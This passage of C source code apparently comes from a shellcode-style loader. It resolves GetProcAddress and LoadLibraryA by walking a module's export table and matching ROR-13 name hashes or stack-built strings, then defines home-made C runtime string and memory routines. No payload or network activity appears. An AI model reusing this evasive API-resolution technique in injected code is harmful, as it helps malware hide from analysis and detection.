	LPWORD pOrdArray  = (LPWORD) (lpBaseAddr+ pExportDir->AddressOfNameOrdinals);

	*fpGetProcAddress = NULL;
	*fpLoadLibraryA = NULL;

#ifdef FAST_POINTERS
	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);
	
		if (GetStringHash(pFuncName, FALSE, 14) == 0x7c0dfcaa) 
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (GetStringHash(pFuncName, FALSE, 12) == 0xec0e4e8e)
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
	
		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#else
	CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);

		if (!__STRCMPI__(pFuncName, strGetProcAddress))
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (!__STRCMPI__(pFuncName, strLoadLibraryA))
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);

		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#endif

	return FALSE;
}

DWORD GetStringHash(
	__in LPVOID lpBuffer, 
	__in BOOL bUnicode, 
	__in UINT uLen)
{
	DWORD dwHash = 0;
	LPSTR strBuffer = (LPSTR) lpBuffer;

	while (uLen--)
    {
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash +=  (DWORD)*strBuffer++;

		if (bUnicode)
				strBuffer++;			
    }
    return dwHash;
}
#pragma optimize( "", on ) 
// CRT
BOOL __ISUPPER__(__in CHAR c) { return ('A' <= c) && (c <= 'Z'); };
CHAR __TOLOWER__(__in CHAR c) { return __ISUPPER__(c) ? c - 'A' + 'a' : c ; };

UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while(lpStr1[i] != 0x0)
		i++;

	return i;
}

UINT __STRLENW__(__in LPWSTR lpStr1)
{
	UINT i = 0;
	while(lpStr1[i] != L'\0')
		i++;

	return i;
}

LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
{
	CHAR c = __TOLOWER__((lpStr2++)[0]);
	if (!c)
		return lpStr1;

	UINT dwLen = __STRLEN__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__((lpStr1++)[0]);
			if (!sc)
				return NULL;
		}
		while (sc != c);
	}
	while(__STRNCMPI__(lpStr1, lpStr2, dwLen) != 0);

	return (lpStr1 - 1); // FIXME: -0?
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;

	UINT dwLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		}
		while (sc != c);
	}
	while(__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);

	return (lpStr1 - 1); // FIXME -2 ?
}

INT __STRCMPI__(
	__in LPSTR lpStr1, 
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter & char is signed 
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	}
	while ((v == 0) && (c1 != '\0') && (c2 != '\0') );
	return v;
}

INT __STRNCMPI__(
	__in LPSTR lpStr1, 
	__in LPSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do
	{
		dwLen--;
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	}
	while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
	return v;
}

INT __STRNCMPIW__(
	__in LPWSTR lpStr1, 
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);

	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest, 
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;

	while(*d) d++;
	
	do { *d++ = *s++; } while(*s);
	*d = 0x0;

	return strDest;
}


LPWSTR __STRCATW__(
	__in LPWSTR	strDest, 
	__in LPWSTR strSource)
{
	LPWSTR d = strDest;
	LPWSTR s = strSource;

	while(*d != L'\0') d++;
	do { *d++ = *s++; } while (*s != L'\0');
	*d = L'\0';

	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst, 
	__in LPVOID lpSrc, 
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE) lpSrc;
	LPBYTE d = (LPBYTE) lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}

#pragma optimize( "", off ) 
VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize)
{
	for (UINT i=0; i<dwSize; i++)
		((PCHAR)p)[i] = cValue;
}
#pragma optimize( "", off ) 

/*
INT __STRCMPIW__(
__in LPWSTR lpStr1, 
__in LPWSTR lpStr2)
{
int  v;
CHAR c1, c2;
do {
c1 = ((PCHAR)lpStr1++)[0];
c2 = ((PCHAR)lpStr2++)[0];
// The casts are necessary when pStr1 is shorter & char is signed 
v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
} while ((v == 0) && (c1 != '\0') && (c2 != '\0') );
return v;
}

INT __STRNCMPIW__(
__in LPWSTR lpStr1, 
__in LPWSTR lpStr2,
__in DWORD dwLen)
{
int  v;
CHAR c1, c2;
do {
dwLen--;
c1 = ((PCHAR)lpStr1++)[0];
c2 = ((PCHAR)lpStr2++)[0];
// The casts are necessary when pStr1 is shorter & char is signed 
v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
} while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
return v;
}


LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
{
CHAR c = __TOLOWER__(*lpStr2++);
if (!c)
return lpStr1;

UINT dwLen = __STRLEN__(lpStr2);
do
{
CHAR sc;
do
{
sc = __TOLOWER__(*lpStr1++);
if (!sc)
return NULL;
}
while (sc != c);
}
while(__STRNCMPI__(lpStr1, lpStr2, dwLen) != 0);

return (lpStr1 - 1);
}




*/

VOID END_LOADER_DATA()
{
	return;
};
